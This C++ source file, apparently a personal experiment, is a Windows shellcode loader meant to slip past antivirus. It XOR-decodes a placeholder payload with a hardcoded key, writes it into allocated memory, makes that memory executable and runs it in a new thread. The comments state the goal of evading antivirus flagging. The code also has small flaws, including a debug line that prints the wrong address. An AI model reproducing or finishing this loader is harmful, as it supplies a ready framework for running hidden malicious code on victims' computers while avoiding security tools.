// Made by xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// Testing purposes
// Looking for a good encoding method to bypass AV agent flagging. Won't fucking do shit, but experimenting
// is important

#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <cstring>

void XOR (char* data, size_t dataLen, char* key, size_t keyLen) {
    int j = 0;

    for (int i = 0; i < dataLen; i++) {
        if (j == keyLen - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main() {
    void* execMemory;
    BOOL returnValue;
    HANDLE thread;
    DWORD oldProtect = 0;

    // Test lol won't work for sure
    unsigned char calcPayload[] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA};
    unsigned int calcPayloadLen = sizeof(calcPayload);
    char key[] = "secretkey123";

    execMemory = VirtualAlloc(NULL, calcPayloadLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // Debugging purposes
    std::cout << "Payload address: " << static_cast<void*>(calcPayload);
    std::cout << "execMemory address: " << static_cast<void*>(calcPayload);
    std::cout << "Press any key to execute payload.\n";
    std::cin.get();

    XOR(reinterpret_cast<char *>(calcPayload), calcPayloadLen, key, sizeof(key));
    RtlMoveMemory(execMemory, calcPayload, calcPayloadLen);
    returnValue = VirtualProtect(execMemory, calcPayloadLen, PAGE_EXECUTE_READWRITE, &oldProtect);

    std::cout << "Payload decrypted\n";
    std::cin.get();

    if (returnValue != 0 ) {
        thread = CreateThread(0, 0, static_cast<LPTHREAD_START_ROUTINE>(execMemory), 0, 0, 0);
        WaitForSingleObject(thread, INFINITE);
    } else {
        std::cerr << "Failed to create thread.\n";
        return -1;
    }


    // I do not want to generate payload now. I fucking hate this Python shit. I will fix it later
}
